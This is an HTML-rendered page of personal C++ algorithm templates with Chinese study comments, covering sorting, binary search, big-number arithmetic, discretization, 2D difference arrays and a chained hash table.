<h1 id="基础算法"><a href="#基础算法" class="headerlink" title="基础算法"></a>基础算法</h1><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//l=第一个存放的位置,r=最后一个存放的位置</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> a[], <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> x = a[(r+l)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i = l<span class="number">-1</span>;</span><br><span class="line">	<span class="type">int</span> j = r+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (l &gt;= r)<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &lt;j) &#123;</span><br><span class="line">		<span class="keyword">do</span> i++; <span class="keyword">while</span> (a[i] &lt; x);</span><br><span class="line">		<span class="keyword">do</span> j--; <span class="keyword">while</span> (a[j] &gt; x);<span class="comment">//一定要记住这个do while他和while 不一样，写while会死，直接咋-1死掉</span></span><br><span class="line">		<span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">			<span class="built_in">swap</span>(a[i], a[j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="built_in">quick_sort</span>(a, l, j);</span><br><span class="line">	<span class="built_in">quick_sort</span>(a, j+<span class="number">1</span>, r);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100000</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> q[N], tmp[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">	<span class="type">int</span> mid = l + r &gt;&gt;<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">merge_sort</span>(q, l, mid);</span><br><span class="line">	<span class="built_in">merge_sort</span>(q, mid+<span class="number">1</span>, r);</span><br><span class="line">	<span class="type">int</span> k = <span class="number">0</span>, i = l, j = mid+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(i &lt;= mid &amp;&amp; j &lt;= r)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(q[i] &lt;= q[j]) tmp[k++] = q[i++];</span><br><span class="line">		<span class="keyword">else</span> tmp[k++] = q[j++];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(i &lt;= mid) tmp[k++] = q[i++];</span><br><span class="line">	<span class="keyword">while</span>(j &lt;= r) tmp[k++] = q[j++];</span><br><span class="line">	<span class="keyword">for</span>(i = l, j = <span class="number">0</span>; i &lt;= r; i++, j++) q[i] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">	<span class="built_in">merge_sort</span>(q, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;n ; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, q[i]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二分查找-整数二分"><a href="#二分查找-整数二分" class="headerlink" title="二分查找(整数二分)"></a>二分查找(整数二分)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>(a, a + n, <span class="built_in">less</span>&lt;<span class="type">int</span>&gt;());<span class="comment">//进行升序排序</span></span><br><span class="line"><span class="built_in">sort</span>(a, a + n, <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());<span class="comment">//降序排序</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">-1</span>, j = n;<span class="comment">//这是重点,把起点放在数组外面</span></span><br><span class="line"><span class="keyword">if</span> (i + <span class="number">1</span> == j)&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot; false&quot;</span> &lt;&lt; endl; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;<span class="comment">//判断空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (k&lt;a[<span class="number">0</span>] || k&gt;a[n - <span class="number">1</span>]) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot; out&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//判断极端情况,k为flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (i+<span class="number">1</span>!=j) &#123;</span><br><span class="line">	<span class="type">int</span> x = (i + j) / <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (k &lt;= a[x])j = x;<span class="comment">//这些不等关系要依据条件,根据红区蓝区来分析</span></span><br><span class="line">	<span class="keyword">if</span> (k &gt; a[x])i = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不好使的话就用这个</span></span><br><span class="line"> <span class="type">int</span> l=<span class="number">1</span>,r=n;</span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">         <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">         <span class="keyword">if</span>(<span class="built_in">sum</span>(mid)&gt;=k )r=mid;</span><br><span class="line">         <span class="keyword">else</span> l=mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="高精度"><a href="#高精度" class="headerlink" title="高精度"></a>高精度</h2><h3 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123;<span class="comment">//加法模块</span></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;C;</span><br><span class="line">	<span class="keyword">if</span> (A.<span class="built_in">size</span>() &lt; B.<span class="built_in">size</span>())<span class="keyword">return</span> <span class="built_in">add</span>(B, A);</span><br><span class="line">	<span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t += A[i];</span><br><span class="line">		<span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t += B[i];</span><br><span class="line">		C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">		t /= <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t)C.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	string a, b;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;A, B;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">auto</span> C = <span class="built_in">add</span>(A, B);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)cout &lt;&lt; C[i];</span><br><span class="line">&#125;<span class="comment">//题目链接https://www.luogu.com.cn/problem/P1601</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123;<span class="comment">//判断a是不是大于b，大于等于1，小于—1</span></span><br><span class="line">	<span class="keyword">if</span> (A.<span class="built_in">size</span>() !=B.<span class="built_in">size</span>())<span class="keyword">return</span> A.<span class="built_in">size</span>()&gt;B.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">			<span class="keyword">if</span> (A[i] != B[i])<span class="keyword">return</span> A[i] &gt; B[i];</span><br><span class="line">		&#125;<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;<span class="comment">//此模块判断a与b的大小，先从第一位开始判断，是bool类型</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sub</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, t = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() ; i++) &#123;</span><br><span class="line">		t = A[i] - t;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>())t -= B[i];</span><br><span class="line">		C.<span class="built_in">push_back</span>((t + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line">		<span class="keyword">if</span> (t &lt; <span class="number">0</span>)t = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span>	t =<span class="number">0</span>;</span><br><span class="line">	&#125;<span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();<span class="comment">//注意这里的while</span></span><br><span class="line">	<span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	string a, b;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;A, B;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);<span class="comment">//注意因等于号导致的数组越界1问题</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);<span class="comment">//注意大小写a，一开始要读入a，这些错了是逻辑错误</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">cmp</span>(A, B)) &#123;</span><br><span class="line">		<span class="keyword">auto</span> C=<span class="built_in">sub</span>(A, B);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)cout &lt;&lt; C[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">auto</span> C = <span class="built_in">sub</span>(B, A);</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;-&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)cout &lt;&lt; C[i];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">mul</span>(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> b) &#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">	<span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || t; i++) &#123;<span class="comment">//t=0时也退出循环</span></span><br><span class="line">		<span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>())t += A[i] * b;</span><br><span class="line">		C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">		t /= <span class="number">10</span>;</span><br><span class="line">	&#125;<span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;A;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">auto</span> C = <span class="built_in">mul</span>(A,  b);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">		cout &lt;&lt; C[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">div</span>(vector&lt;<span class="type">int</span>&gt;&amp; A,  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> b) &#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">	   <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>()<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">       r = r * <span class="number">10</span> + A[i];</span><br><span class="line">	   C.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">	   r %= b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(), C.<span class="built_in">end</span>());</span><br><span class="line">	<span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">	<span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> b;</span><br><span class="line">    string a;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;A;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">auto</span> C = <span class="built_in">div</span>(A, b);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">		cout &lt;&lt; C[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="离散化-适用于值域很大-数据量很小"><a href="#离散化-适用于值域很大-数据量很小" class="headerlink" title="离散化(适用于值域很大,数据量很小)"></a>离散化(适用于值域很大,数据量很小)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span> ,<span class="type">int</span> &gt; pii;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; alls;</span><br><span class="line">vector&lt;pii&gt; add, query;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">300010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> a[N], s[N];<span class="comment">//a[存放数组离散前的]s算前缀和</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> l = <span class="number">-1</span>; <span class="type">int</span> r = alls.<span class="built_in">size</span>();</span><br><span class="line">	<span class="keyword">while</span> (l + <span class="number">1</span> != r) &#123;<span class="comment">//采用二分寻找答案,找到第一个大于等于x的位置</span></span><br><span class="line">		<span class="type">int</span> mid = (r + l) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (alls[mid]&gt;=x)r = mid;</span><br><span class="line">		<span class="keyword">else</span> l = mid;</span><br><span class="line">	&#125;<span class="keyword">return</span> r + <span class="number">1</span>;<span class="comment">//将x映射到1-alls.size,x表示位置</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="type">int</span> x, c;</span><br><span class="line">		cin &gt;&gt; x &gt;&gt; c;</span><br><span class="line">		alls.<span class="built_in">push_back</span>(x);</span><br><span class="line">		add.<span class="built_in">push_back</span>(&#123; x,c &#125;);<span class="comment">//数据存入</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">		<span class="type">int</span> l, r;</span><br><span class="line">		cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">		query.<span class="built_in">push_back</span>(&#123; l,r &#125;);</span><br><span class="line">		alls.<span class="built_in">push_back</span>(l);</span><br><span class="line">		alls.<span class="built_in">push_back</span>(r);<span class="comment">//将数据分别存到三个数组当中</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//去重</span></span><br><span class="line">	<span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">	alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>());<span class="comment">//去重，返回去重完alls的末尾位置,必须要先排序再去重</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> item : add) &#123;<span class="comment">//对add中的每个元素进行迭代</span></span><br><span class="line">		<span class="type">int</span> x = <span class="built_in">find</span>(item.first);</span><br><span class="line">		a[x] += item.second;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//预处理前缀和 </span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= alls.<span class="built_in">size</span>(); i++)s[i] = s[i - <span class="number">1</span>] + a[i];<span class="comment">//位置寄托在alls中，数寄托在a【i】中</span></span><br><span class="line">	<span class="comment">//处理询问</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> item : query) &#123;</span><br><span class="line">		<span class="type">int</span> l = <span class="built_in">find</span>(item.first), r = <span class="built_in">find</span>(item.second);<span class="comment">//将l和r在alls里面映射</span></span><br><span class="line">		cout &lt;&lt; s[r] - s[l - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二维前缀和差分"><a href="#二维前缀和差分" class="headerlink" title="二维前缀和差分"></a>二维前缀和差分</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//要有开始，要有结尾</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> x2, <span class="type">int</span> y2, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">	b[x1][y1] += c;</span><br><span class="line">	b[x2 + <span class="number">1</span>][y1] -= c;</span><br><span class="line">	b[x1][y2 + <span class="number">1</span>] -= c;</span><br><span class="line">	b[x2 + <span class="number">1</span>][y2 + <span class="number">1</span>] += c;<span class="comment">//这是一个重要的预处理步骤</span></span><br><span class="line">	<span class="comment">//不仅在前面完成了b数组的初始化，并且在插入过程中完成的b的增值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m,q, x1, x2, y1, y2,c;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m &gt;&gt; q;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			cin &gt;&gt; a[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="comment">//初始化a数组</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			<span class="built_in">insert</span>( i,  j,  i,  j, a[i][j]);<span class="comment">//先遍历一遍数组b，进行插入,使得b是a的差分</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (q--)</span><br><span class="line">	&#123;</span><br><span class="line">		cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2 &gt;&gt; c;</span><br><span class="line">		<span class="built_in">insert</span>(x1, y1, x2, y2, c);</span><br><span class="line">		<span class="comment">//再求b的前缀和</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			<span class="comment">//求数组b的前缀和</span></span><br><span class="line">			b[i][j] += b[i - <span class="number">1</span>][j] + b[i][j - <span class="number">1</span>] - b[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// 因为我们最后要求的是加完了c后的a数组，而b的前缀和是a数组，所以我们直接算出b的前缀和就行</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			cout &lt;&lt; b[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><h3 id="一般哈希"><a href="#一般哈希" class="headerlink" title="一般哈希"></a>一般哈希</h3><h4 id="拉链法"><a href="#拉链法" class="headerlink" title="拉链法"></a><strong>拉链法</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const int N = 100003;//一般mol的数要选择一个质数</span><br><span class="line">int h[N],e[N],ne[N],idx;</span><br><span class="line">void insert(int x) &#123;</span><br><span class="line">	//将x映射到哈希函数上</span><br><span class="line">	int k = (x % N + N) % N;</span><br><span class="line">	e[idx] = x, ne[idx] = h[k], h[k] = idx++;//单链表的插入</span><br><span class="line">&#125;</span><br><span class="line">bool find(int x) &#123;</span><br><span class="line">	int k = (x % N + N) % N;//k是映射到哈希函数上的值，使得复数mol完后变成一个整数，在c++中负数mol完会变成负数</span><br><span class="line">	for (int i = h[k]; i != -1; i = ne[i]) &#123;</span><br><span class="line">		if (e[i] == x)</span><br><span class="line">			return true;&#125;</span><br><span class="line">	return false;//return false 是最后的判断，若是找不到就返回false</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">	int n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	memset(h, -1, sizeof h);//所有初始化,初始化为-1,拉链法</span><br><span class="line">	while (n--) &#123;</span><br><span class="line">		char op[2];</span><br><span class="line">		int x;</span><br><span class="line">		cin &gt;&gt; op &gt;&gt; x;</span><br><span class="line">		if (op[0] == &#x27;I&#x27;)insert(x);</span><br><span class="line">		else &#123;</span><br><span class="line">			if (find(x))cout &lt;&lt; &quot;yes&quot;&lt;&lt;endl;</span><br><span class="line">			else cout &lt;&lt; &quot;No&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

